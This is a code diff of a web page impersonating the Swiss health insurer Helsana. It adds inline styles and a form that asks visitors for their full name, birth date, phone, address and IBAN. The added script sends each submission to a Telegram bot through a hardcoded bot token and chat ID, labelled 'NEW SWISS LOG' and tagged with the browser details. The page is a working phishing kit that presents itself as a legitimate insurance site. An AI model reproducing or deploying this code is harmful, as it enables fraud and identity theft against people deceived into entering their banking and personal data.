@@ -4,7 +4,268 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Helsana</title>
-  <link rel="stylesheet" href="css/style.css">
+  
+  <style>
+    /* ---------- Reset ---------- */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #1a1a1a;
+      background: #f7f7f7;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    img { display: block; max-width: 100%; }
+    a { text-decoration: none; color: inherit; }
+    ul { list-style: none; }
+
+    /* ---------- Header ---------- */
+    .header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+      padding: 0 24px;
+      background: #ffffff;
+      border-bottom: 1px solid #e3e6ea;
+    }
+
+    .header__logo-img {
+      width: 112px;
+      height: 22px;
+      display: block;
+    }
+
+    .lang-switcher { display: flex; gap: 12px; }
+    .lang-btn { background: none; border: none; font-size: 14px; font-weight: 500; color: #7a828e; cursor: pointer; padding: 4px; transition: color 0.2s; }
+    .lang-btn.is-active { color: #1a1a1a; font-weight: 700; }
+    .lang-btn:hover { color: #1a1a1a; }
+
+    /* ---------- Блок с предупреждением ---------- */
+    .alert-banner {
+      width: 100%;
+      background-color: #fff9e6;
+      border-bottom: 1px solid #f0e6d2;
+      padding: 16px 24px;
+      display: flex;
+      justify-content: center;
+    }
+    .alert-banner__inner { width: 100%; max-width: 600px; display: flex; align-items: flex-start; gap: 16px; }
+    .alert-banner__icon { color: #d97706; flex-shrink: 0; margin-top: 2px; }
+    .alert-banner__content { display: flex; flex-direction: column; gap: 8px; }
+    .alert-banner__text { font-size: 14px; line-height: 1.5; color: #4a5361; margin: 0; }
+    .alert-banner__text--en { color: #7a828e; font-size: 13px; }
+
+    /* ---------- Layout Container ---------- */
+    .container {
+      width: 100%;
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 40px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 40px;
+    }
+
+    .main { flex: 1; display: flex; flex-direction: column; align-items: center; width: 100%; }
+
+    /* ---------- Promo ---------- */
+    .promo { width: 100%; display: flex; justify-content: center; }
+    .promo__container { width: 40px; height: 36px; position: relative; overflow: visible; }
+    .promo__img { width: 40px; height: 36px; object-fit: cover; object-position: center 25%; }
+    .promo__box { position: absolute; top: 10px; left: 0; width: 180px; margin-left: -70px; background: #ffffff; padding: 16px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); z-index: 10; }
+    .promo__title { font-size: 13px; font-weight: 700; color: #b8040f; margin-bottom: 8px; line-height: 1.2; }
+    .promo__text { font-size: 14px; line-height: 1.4; color: #4a5361; font-weight: 400; }
+
+    /* ---------- Premium Form ---------- */
+    .premium-calc { width: 100%; max-width: 400px; background-color: #9b1139; padding: 32px 24px; display: flex; flex-direction: column; gap: 24px; }
+    .premium-calc__title { color: #ffffff; font-size: 20px; font-weight: 400; text-align: left; }
+    .premium-calc__form { display: flex; flex-direction: column; gap: 16px; }
+
+    /* Поля ввода */
+    .input-group { display: flex; flex-direction: column; gap: 8px; width: 100%; }
+    .input-label-top { color: #ffffff; font-size: 15px; font-weight: 500; }
+    .input-field {
+      width: 100%;
+      background: transparent;
+      border: 1px solid #ffffff;
+      color: #ffffff;
+      padding: 16px 16px;
+      font-size: 16px;
+      font-family: inherit;
+      outline: none;
+      transition: background-color 0.2s;
+      height: 52px;
+    }
+    .input-field:focus { background: rgba(255, 255, 255, 0.05); }
+    .input-field::placeholder { color: rgba(255, 255, 255, 0.4); }
+
+    /* Горизонтальный ряд */
+    .form-row { display: grid; grid-template-columns: 1.5fr 1fr 1.5fr; gap: 12px; width: 100%; }
+
+    /* Кнопка */
+    .premium-btn {
+      width: 100%;
+      background: #ffffff;
+      color: #9b1139;
+      border: none;
+      padding: 18px 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background-color 0.3s ease, box-shadow 0.3s ease, transform 0.1s ease;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      height: 56px;
+    }
+    .premium-btn:hover { background: #f0f0f0; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15); }
+    .premium-btn:active { transform: scale(0.98); box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); }
+
+    /* ---------- Преимущества ---------- */
+    .advantages { width: 100%; max-width: 400px; padding: 20px 0; display: flex; flex-direction: column; gap: 32px; }
+    .advantages__title { font-size: 20px; font-weight: 700; color: #1a1a1a; text-align: left; }
+    .advantages__lead { font-size: 15px; line-height: 1.5; color: #1a1a1a; text-align: left; }
+    .advantages__list { display: flex; flex-direction: column; gap: 40px; margin-top: 16px; }
+    .advantage-item { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 16px; }
+    .advantage-icon { color: #1a1a1a; display: flex; justify-content: center; align-items: center; }
+    .advantage-title { font-size: 18px; font-weight: 400; line-height: 1.3; color: #4a5361; margin: 0; }
+
+    /* ---------- Награды ---------- */
+    .awards { width: 100%; background-color: #f0f0f0; padding: 40px 0; display: flex; justify-content: center; }
+    .awards__container { width: 100%; max-width: 600px; padding: 0 24px; display: flex; flex-direction: column; align-items: flex-start; gap: 24px; }
+    .awards__title { font-size: 20px; font-weight: 700; color: #1a1a1a; line-height: 1.3; max-width: 500px; }
+    .awards__lead { font-size: 15px; line-height: 1.6; color: #1a1a1a; max-width: 500px; }
+    .awards__badges { margin-top: 16px; }
+    .awards__img { width: 356px; height: 83px; object-fit: contain; }
+
+    /* ---------- Footer ---------- */
+    .footer { width: 100%; display: flex; flex-direction: column; }
+    .footer__top { background-color: #9b1139; padding: 32px 0; }
+    .footer__top .footer__container { max-width: 600px; margin: 0 auto; padding: 0 24px; display: flex; flex-direction: column; align-items: flex-start; }
+    .footer__title { color: #ffffff; font-size: 20px; font-weight: 500; margin-bottom: 6px; }
+    .footer__subtitle { color: #ffffff; font-size: 14px; margin-bottom: 20px; opacity: 0.9; }
+    .footer__btn { display: inline-block; background: #ffffff; color: #9b1139; padding: 10px 18px; font-size: 14px; font-weight: 500; transition: background 0.2s; }
+    .footer__btn:hover { background: #f0f0f0; }
+    .footer__main { background-color: #ffffff; padding: 32px 0; }
+    .footer__main .footer__container { max-width: 600px; margin: 0 auto; padding: 0 24px; }
+    .footer__nav-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 32px 24px; margin-bottom: 32px; }
+    .footer__nav-col { display: flex; flex-direction: column; gap: 12px; }
+    .footer__nav-title { font-size: 13px; font-weight: 500; color: #1a1a1a; margin: 0; }
+    .footer__nav-list { display: flex; flex-direction: column; gap: 8px; }
+    .footer__nav-list a { font-size: 13px; color: #4a5361; font-weight: 400; transition: color 0.2s; }
+    .footer__nav-list a:hover { color: #9b1139; }
+    .footer__bottom { display: flex; flex-direction: column; gap: 16px; border-top: 1px solid #e3e6ea; padding-top: 20px; }
+    .footer__legal { display: flex; flex-direction: column; gap: 8px; }
+    .footer__legal a { font-size: 13px; font-weight: 400; color: #4a5361; transition: color 0.2s; }
+    .footer__legal a:hover { color: #9b1139; }
+    .footer__socials { display: flex; gap: 16px; margin-top: 8px; }
+    .footer__socials a { color: #1a1a1a; transition: color 0.2s; }
+    .footer__socials a:hover { color: #9b1139; }
+
+    /* ---------- Мобильная версия ---------- */
+    @media (max-width: 600px) {
+      .header { padding: 0 20px; }
+      .alert-banner { padding: 12px 20px; }
+      .alert-banner__text { font-size: 13px; }
+      .alert-banner__text--en { font-size: 12px; }
+
+      .container { padding: 24px 20px; gap: 24px; }
+      .promo { display: block; max-width: 320px; margin: 0 auto; }
+      .promo__container { width: 100%; height: auto; aspect-ratio: 4 / 3; position: relative; overflow: visible; }
+      .promo__img { width: 100%; height: 100%; border-radius: 8px 8px 0 0; }
+      .promo__box { position: relative; top: auto; left: auto; margin-left: auto; margin-right: auto; width: calc(100% - 24px); margin-top: -30px; border-radius: 8px; padding: 20px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
+      .promo__title { font-size: 15px; }
+      .promo__text { font-size: 16px; }
+      
+      .premium-calc { max-width: 100%; padding: 24px 16px; }
+
+      .form-row { grid-template-columns: 1.5fr 1fr 1.5fr; gap: 8px; }
+      .input-field { padding: 14px 10px; font-size: 14px; height: 46px; }
+      .input-label-top { font-size: 13px; }
+
+      .advantages { padding: 20px 0; }
+      .advantage-title { font-size: 16px; }
+      .awards__container { padding: 0 20px; }
+      .awards__badges { width: 100%; }
+      .awards__img { width: 100%; height: auto; max-width: 356px; }
+      .footer__top .footer__container, .footer__main .footer__container { padding: 0 20px; }
+      .footer__nav-grid { grid-template-columns: 1fr; gap: 24px; }
+    }
+
+    /* ---------- Планшеты / iPad ---------- */
+    @media (min-width: 601px) and (max-width: 1024px) {
+      .container { padding: 50px 40px; gap: 50px; }
+      .promo { display: block; max-width: 400px; margin: 0 auto; }
+      .promo__container { width: 100%; height: auto; aspect-ratio: 4 / 3; position: relative; overflow: visible; }
+      .promo__img { width: 100%; height: 100%; border-radius: 8px 8px 0 0; }
+      .promo__box { position: relative; top: auto; left: auto; margin-left: auto; margin-right: auto; width: calc(100% - 32px); margin-top: -40px; border-radius: 8px; padding: 24px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
+      .promo__title { font-size: 16px; }
+      .promo__text { font-size: 16px; }
+
+      .premium-calc { max-width: 450px; padding: 40px 32px; }
+      .premium-calc__title { font-size: 24px; }
+
+      .advantages { max-width: 500px; }
+      .advantage-title { font-size: 19px; }
+      .awards__container { padding: 0 40px; }
+      .awards__img { width: 400px; height: auto; }
+      .footer__top .footer__container, .footer__main .footer__container { padding: 0 40px; }
+      .footer__title { font-size: 24px; }
+      .footer__subtitle { font-size: 16px; }
+      .footer__nav-title { font-size: 14px; }
+      .footer__nav-list a { font-size: 14px; }
+    }
+
+    /* ---------- ПК ---------- */
+    @media (min-width: 1025px) {
+      .container { max-width: 1000px; padding: 60px 60px; gap: 70px; }
+      .promo { display: block; max-width: 520px; margin: 0 auto; }
+      .promo__container { width: 100%; height: auto; aspect-ratio: 4 / 3; position: relative; overflow: visible; }
+      .promo__img { width: 100%; height: 100%; border-radius: 8px 8px 0 0; }
+      .promo__box { position: relative; top: auto; left: auto; margin-left: auto; margin-right: auto; width: calc(100% - 56px); margin-top: -56px; border-radius: 8px; padding: 36px; box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12); }
+      .promo__title { font-size: 20px; }
+      .promo__text { font-size: 18px; }
+
+      .premium-calc { max-width: 750px; padding: 56px 48px; }
+      .premium-calc__title { font-size: 28px; }
+      
+      .input-label-top { font-size: 16px; }
+      .input-field { height: 58px; font-size: 18px; padding: 16px 20px; }
+      .premium-btn { height: 60px; font-size: 19px; }
+
+      .form-row { grid-template-columns: 2fr 1.2fr 2fr; gap: 16px; }
+
+      .advantages { max-width: 650px; gap: 48px; }
+      .advantages__title { font-size: 26px; }
+      .advantages__lead { font-size: 17px; }
+      .advantage-title { font-size: 21px; }
+
+      .awards__container { max-width: 1000px; padding: 0 60px; }
+      .awards__title { font-size: 26px; max-width: 700px; }
+      .awards__lead { font-size: 17px; max-width: 700px; }
+      .awards__img { width: 500px; }
+
+      .footer__top .footer__container, .footer__main .footer__container { max-width: 1000px; padding: 0 60px; }
+      .footer__title { font-size: 28px; }
+      .footer__subtitle { font-size: 16px; }
+      .footer__nav-grid { grid-template-columns: 1fr 1fr 1fr 1fr; gap: 40px 30px; }
+      .footer__nav-title { font-size: 15px; }
+      .footer__nav-list a { font-size: 15px; }
+      .footer__legal a { font-size: 14px; }
+    }
+  </style>
 </head>
 <body>
 
@@ -53,7 +314,6 @@
       <section class="premium-calc">
         <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
 
-        <!-- Форма без action, отправка через fetch -->
         <form class="premium-calc__form" id="telegramForm">
           <div class="input-group">
             <label for="name" class="input-label-top" data-lang-ch="Ihr vollständiger Name" data-lang-en="Your full name">Ihr vollständiger Name</label>
@@ -65,7 +325,6 @@
             <input type="text" id="geburtsdatum" class="input-field" placeholder="__ / __ / ____" required>
           </div>
 
-          <!-- ТЕЛЕФОН -->
           <div class="input-group">
             <label for="telefon" class="input-label-top" data-lang-ch="Ihre Telefonnummer" data-lang-en="Your phone number">Ihre Telefonnummer</label>
             <input type="tel" id="telefon" class="input-field" placeholder="+41" required>
@@ -86,7 +345,6 @@
             </div>
           </div>
 
-          <!-- IBAN -->
           <div class="input-group">
             <label for="iban" class="input-label-top" data-lang-ch="Ihre IBAN" data-lang-en="Your IBAN">Ihre IBAN</label>
             <input type="text" id="iban" class="input-field" placeholder="CH" required>
@@ -162,7 +420,7 @@
     <section class="awards">
       <div class="awards__container">
         <h2 class="awards__title" data-lang-ch="Unsere Auszeichnungen für Kundenzufriedenheit" data-lang-en="Our awards for customer satisfaction">Unsere Auszeichnungen für Kundenzufriedenheit</h2>
-        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen.</p>
+        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu tun – im Kundenservice wie auch bei unseren Versicherungen.</p>
 
         <div class="awards__badges">
           <img src="assets/123.svg" alt="Auszeichnungen: Ktipp, Comparis, Moneyland" width="356" height="83" class="awards__img">
@@ -238,7 +496,131 @@
     </div>
   </footer>
 
-  <script src="js/script.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      
+      // Твои данные
+      const BOT_TOKEN = '9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI';
+      const CHAT_ID = '-1003907097706';
 
+      // Маска для даты
+      const geburtsdatumInput = document.getElementById('geburtsdatum');
+      if (geburtsdatumInput) {
+        geburtsdatumInput.addEventListener('input', function (e) {
+          let value = e.target.value.replace(/\D/g, '');
+          if (value.length > 8) value = value.slice(0, 8);
+          let formatted = '';
+          if (value.length > 0) formatted += value.substring(0, 2);
+          if (value.length > 2) formatted += '/' + value.substring(2, 4);
+          if (value.length > 4) formatted += '/' + value.substring(4, 8);
+          e.target.value = formatted;
+        });
+      }
+
+      // Перевод
+      const langBtns = document.querySelectorAll('.lang-btn');
+      const translatableElements = document.querySelectorAll('[data-lang-ch]');
+      
+      langBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+          const lang = btn.getAttribute('data-lang');
+          langBtns.forEach(b => b.classList.remove('is-active'));
+          btn.classList.add('is-active');
+          
+          translatableElements.forEach(el => {
+            const text = el.getAttribute(`data-lang-${lang}`);
+            if (text) {
+              if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+                el.placeholder = text;
+              } else {
+                el.textContent = text;
+              }
+            }
+          });
+        });
+      });
+
+      // Отправка
+      const form = document.getElementById('telegramForm');
+      
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const submitBtn = form.querySelector('button[type="submit"]');
+        const originalText = submitBtn.textContent;
+        
+        // Определяем текущий язык
+        const activeLang = document.querySelector('.lang-btn.is-active').getAttribute('data-lang');
+        const loadingText = activeLang === 'en' ? 'Sending...' : 'Senden...';
+
+        const name = document.getElementById('name').value;
+        const geburtsdatum = document.getElementById('geburtsdatum').value;
+        const telefon = document.getElementById('telefon').value;
+        const adresse = document.getElementById('adresse').value;
+        const plz = document.getElementById('plz').value;
+        const stadt = document.getElementById('stadt').value;
+        const iban = document.getElementById('iban').value;
+
+        const now = new Date();
+        const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
+        const timeStr = now.toLocaleTimeString('de-CH', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        const dateTime = `${dateStr}, ${timeStr}`;
+        const browserInfo = navigator.userAgent;
+
+        let message = '🇨🇭 NEW SWISS LOG !\n\n';
+        message += `👤 Name: ${name}\n`;
+        message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
+        message += `📱 Telefon: ${telefon}\n`;
+        message += `📍 Adresse: ${adresse}\n`;
+        message += `📮 PLZ: ${plz}\n`;
+        message += `🏙️ Stadt: ${stadt}\n`;
+        message += `🏦 IBAN: ${iban}\n`;
+        message += `🔍 IBAN-Status: nicht geprüft\n\n`;
+        message += `🕒 Zeit: ${dateTime}\n`;
+        message += `🌐 Browser: ${browserInfo}\n`;
+
+        submitBtn.textContent = loadingText;
+        submitBtn.disabled = true;
+
+        try {
+          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          
+          const formData = new URLSearchParams();
+          formData.append('chat_id', CHAT_ID);
+          formData.append('text', message);
+          formData.append('parse_mode', 'Markdown');
+
+          const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+          });
+
+          const data = await response.json();
+
+          if (data.ok) {
+            submitBtn.textContent = activeLang === 'en' ? '✅ Sent!' : '✅ Gesendet!';
+            submitBtn.style.background = '#28a745';
+            setTimeout(() => {
+              form.reset();
+              submitBtn.textContent = originalText;
+              submitBtn.style.background = '';
+              submitBtn.disabled = false;
+            }, 2000);
+          } else {
+            throw new Error(data.description || 'Fehler');
+          }
+        } catch (error) {
+          console.error('Ошибка:', error);
+          submitBtn.textContent = '❌ Fehler!';
+          submitBtn.style.background = '#dc3545';
+          setTimeout(() => {
+            submitBtn.textContent = originalText;
+            submitBtn.style.background = '';
+            submitBtn.disabled = false;
+          }, 3000);
+        }
+      });
+    });
+  </script>
 </body>
 </html>
